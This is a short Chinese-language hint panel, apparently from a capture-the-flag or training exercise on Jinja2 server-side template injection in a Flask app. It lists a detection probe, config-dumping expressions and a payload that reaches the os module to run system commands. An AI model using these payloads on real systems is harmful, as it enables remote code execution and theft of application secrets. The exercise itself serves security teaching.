需要提示？
  • 後端使用 Python Flask + Jinja2，且直接將使用者輸入嵌入模板字串後再渲染。
  • Jinja2 使用 {{ '{{' }} ... {{ '}}' }} 執行表達式。
    試試看輸入 {{ '{{' }}7*7{{ '}}' }}，看看結果是 49 還是字串本身。
  • Flask 應用程式設定可以透過 {{ '{{' }}config{{ '}}' }} 列出，
    也可用 {{ '{{' }}config['KEY']{{ '}}' }} 讀取特定值。
  • 進階：透過 Python 物件鏈取得 os 模組後可執行任意系統指令：
    {{ '{{' }}config.__class__.__init__.__globals__['os'].popen('id').read(){{ '}}' }}
